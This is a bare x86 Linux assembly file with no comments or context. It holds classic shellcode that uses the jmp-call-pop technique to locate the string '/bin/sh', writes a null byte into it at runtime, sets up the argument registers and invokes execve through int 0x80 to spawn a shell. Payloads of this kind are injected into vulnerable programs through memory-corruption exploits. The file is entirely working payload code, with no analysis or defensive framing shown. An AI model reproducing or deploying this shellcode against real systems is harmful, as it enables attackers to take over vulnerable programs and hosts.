section .text

  global  _start

_start:

  jmp end
code:
  pop ebx			
  xor eax, eax
  mov [ebx + 7], al
  mov edx,eax
  push eax		
  push ebx	
  mov ecx,esp
  mov al, 0x0b
  int 0x80
end:
  call code
  db "/bin/shJ"
